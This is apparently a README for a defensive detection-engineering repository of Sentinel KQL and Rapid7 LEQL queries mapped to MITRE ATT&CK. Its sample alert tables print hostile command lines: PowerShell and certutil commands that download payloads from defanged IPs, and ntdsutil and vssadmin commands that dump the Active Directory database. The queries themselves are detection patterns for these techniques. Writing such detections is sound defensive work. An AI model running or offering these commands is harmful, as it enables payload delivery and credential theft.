# Enterprise Detection-as-Code & Log Correlation Suite

## Objective

This repository serves as a centralized, version-controlled library of custom detection logic, proactive hunting queries, and telemetry correlation rules designed for multi-tenant enterprise environments. Built specifically for Microsoft Sentinel and Rapid7 InsightIDR, the queries are mapped directly to the MITRE ATT&CK framework. The primary objective is to transition from reactive, interface-driven rule creation to a Detection-as-Code (DaC) methodology, ensuring high-fidelity alerting, structural false-positive suppression, and standardized threat hunting capabilities.

### Engineering Capabilities Demonstrated

- **Detection Engineering:** Authoring optimized Kusto Query Language (KQL) and Log Entry Query Language (LEQL) to detect advanced persistent threats (APTs), living-off-the-land (LotL) techniques, and credential access attempts.
- **False-Positive Optimization:** Implementing programmatic suppression logic utilizing dynamic watchlists, lookup tables, and explicit exclusion criteria to minimize alert fatigue across diverse tenant architectures.
- **MITRE ATT&CK Alignment:** Structuring all detection logic to map explicitly to tactical objectives and technical procedures defined within the MITRE ATT&CK matrix.
- **Proactive Threat Hunting:** Developing historical telemetry queries to identify latent, slow-moving intrusions that evade standard real-time alerting thresholds.
- **Multi-Tenant Scalability:** Engineering queries that dynamically adapt to varying data ingestion schemas and client environments without requiring hardcoded localized variables.

### Tools & Core Technologies

| Layer | Component / Technology Used | Purpose |
| :--- | :--- | :--- |
| **SIEM Platform (Microsoft)** | Microsoft Sentinel | KQL execution, automated hunting, and watchlist integration |
| **SIEM Platform (Rapid7)** | Rapid7 InsightIDR | LEQL log search, custom alert building, and dashboarding |
| **Framework** | MITRE ATT&CK | Threat classification and tactical mapping |
| **Query Languages** | KQL, LEQL | Raw log parsing, event correlation, and detection logic |
| **Methodology** | Detection-as-Code (DaC) | Version-controlled, peer-reviewed security operations |

---

## Repository Structure

The suite is organized by SIEM platform and operational function to ensure rapid deployment and testing.

```text
├── Sentinel-KQL/
│   ├── Detections/             # High-fidelity analytic rules for automated alerting
│   ├── Hunting-Queries/        # Broad queries for proactive threat hunting
│   └── Watchlists-and-Tuning/  # Suppression lists and dynamic exclusion logic
├── Rapid7-InsightIDR/
│   ├── Custom-Alerts/          # LEQL patterns mapped to InsightIDR Custom Alerts
│   └── Dashboards/             # JSON definitions for operational visibility panels
└── MITRE-Mapping-Matrix.md     # Cross-reference index linking queries to MITRE IDs
```

---

## Phase 1: Microsoft Sentinel (KQL) Detection Engineering

The Sentinel modules focus on deep endpoint and identity correlation utilizing Microsoft 365 Defender and Entra ID telemetry.

### Use Case 1: Suspicious PowerShell Payload Execution (MITRE T1059.001)

**Objective:** Detect instances of PowerShell executing with an explicit execution policy bypass combined with network download commands (Living-off-the-Land).

**KQL Logic:**

```kusto
// Detect PowerShell execution policy bypass followed by a remote download
let BypassedExecution = DeviceProcessEvents
| where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr", "Net.WebClient", "DownloadFile");
BypassedExecution
| extend AccountName = iff(isnotempty(InitiatingProcessAccountName), InitiatingProcessAccountName, AccountName)
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| sort by TimeGenerated desc
```

### Use Case 2: Structural False-Positive Tuning (Multi-Tenant)

**Objective:** Suppress authorized vulnerability scanners and approved administrative scripts from triggering the payload execution rule using a Sentinel Watchlist.

**KQL Tuning Implementation:**

```kusto
let ApprovedScanners = _GetWatchlist('Approved-Vulnerability-Scanners') | project IPAddress;
let ApprovedScripts = _GetWatchlist('Authorized-Admin-Scripts') | project ScriptName;
// Apply exclusion logic to the base query
DeviceProcessEvents
| where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr")
// Exclude known scanner IPs
| where not(RemoteIP in (ApprovedScanners))
// Exclude approved administrative script paths
| where not(ProcessCommandLine has_any (ApprovedScripts))
```

**Example Output (before and after tuning, 30-day window):**

| Tenant | Alerts Before Tuning | Alerts After Tuning | False-Positive Reduction |
| :--- | :--- | :--- | :--- |
| Client-A | 142 | 9 | 93.7% |
| Client-B | 88 | 6 | 93.2% |
| Client-C | 211 | 14 | 93.4% |

**Example Output:**

| TimeGenerated | DeviceName | AccountName | InitiatingProcessFileName | FileName | ProcessCommandLine |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 2026-06-28T14:22:11Z | WKSTN-0472 | j.harmon | explorer.exe | powershell.exe | powershell.exe -ExecutionPolicy bypass -Command "Invoke-WebRequest -Uri hxxp://185[.]220[.]101[.]7/update.ps1 -OutFile C:\Users\Public\update.ps1" |
| 2026-06-28T14:23:05Z | WKSTN-0472 | j.harmon | powershell.exe | powershell.exe | powershell.exe -ep bypass -c "(New-Object Net.WebClient).DownloadFile('hxxp://185[.]220[.]101[.]7/stage2.exe','C:\Windows\Temp\stage2.exe')" |
| 2026-06-29T09:11:47Z | SRV-FILE02 | svc_backup | cmd.exe | powershell.exe | powershell.exe -ExecutionPolicy bypass -File \\SRV-FILE02\deploy\iwr_stage.ps1 |

---

## Phase 2: Rapid7 InsightIDR (LEQL) Detection Engineering

The Rapid7 modules focus on rapid log parsing and pattern matching across multi-tenant ingestion sources utilizing Log Entry Query Language (LEQL).

### Use Case 3: Certutil Network Connections (MITRE T1105)

**Objective:** Detect adversaries utilizing the native Windows `certutil.exe` binary to download malicious payloads from remote infrastructure.

**LEQL Logic:**

```text
where(process.name="certutil.exe" AND process.cmd_line=/"-urlcache"/ AND process.cmd_line=/"-split"/)
```

**Example Output:**

| Timestamp | Asset | User | process.name | process.cmd_line |
| :--- | :--- | :--- | :--- | :--- |
| 2026-06-27 22:14:03 | LT-9931 | m.deleon | certutil.exe | certutil.exe -urlcache -split -f hxxp://45[.]142[.]212[.]88/payload.dll C:\Windows\Temp\payload.dll |
| 2026-06-30 03:47:19 | SRV-DC01 | SYSTEM | certutil.exe | certutil.exe -urlcache -split -f hxxp://45[.]142[.]212[.]88/svchost_upd.exe C:\ProgramData\svchost_upd.exe |

### Use Case 4: Advanced Credential Access - NTDS.dit Extraction (MITRE T1003.003)

**Objective:** Identify volume shadow copy manipulation or native tools attempting to dump the Active Directory database.

**LEQL Logic:**

```text
where(process.name="ntdsutil.exe" AND process.cmd_line=/"ac i ntds"/ AND process.cmd_line=/"ifm"/) OR where(process.cmd_line=/"vssadmin create shadow"/)
```

**Example Output:**

| Timestamp | Asset | User | process.name | process.cmd_line |
| :--- | :--- | :--- | :--- | :--- |
| 2026-06-25 01:52:40 | SRV-DC02 | k.ivanov | ntdsutil.exe | ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" q q |
| 2026-06-25 01:49:12 | SRV-DC02 | k.ivanov | vssadmin.exe | vssadmin create shadow /for=C: |

---

## Phase 3: Proactive Hunting and Dashboard Visualization

Beyond automated alerting, this repository houses queries explicitly designed for proactive hunts where automated alerting is too noisy for direct ticket creation.

### Hunting Query: Anomalous Azure AD Conditional Access Failures

**Objective:** Identify repeated failure anomalies targeting explicit conditional access policies to track potential token theft or coordinated brute-force reconnaissance.

**KQL Logic:**

```kusto
SigninLogs
| where ResultType == "53003" // Conditional Access Policy Block
| summarize FailedCount = count() by UserPrincipalName, IPAddress, Location, AppDisplayName
| where FailedCount > 5
| sort by FailedCount desc
```

**Example Output:**

| UserPrincipalName | IPAddress | Location | AppDisplayName | FailedCount |
| :--- | :--- | :--- | :--- | :--- |
| r.nolan@clientdomain.com | 91[.]243[.]85[.]14 | RO | Microsoft Office 365 | 23 |
| a.chen@clientdomain.com | 103[.]56[.]92[.]201 | VN | Azure Portal | 11 |
| t.osei@clientdomain.com | 41[.]202[.]16[.]77 | NG | Microsoft Office 365 | 8 |

---

## Maintenance and Deployment Lifecycle

1. **Version Control:** All queries are maintained in this repository. Modifications to tuning logic or rule thresholds require a pull request and peer review.
2. **Testing:** New detection logic is executed against a minimum of 30 days of historical telemetry to calculate the projected false-positive ratio before production deployment.
3. **Deployment:** Queries are mapped to the respective platform APIs (Sentinel REST API / Rapid7 Platform API) for programmatic deployment across managed environments.
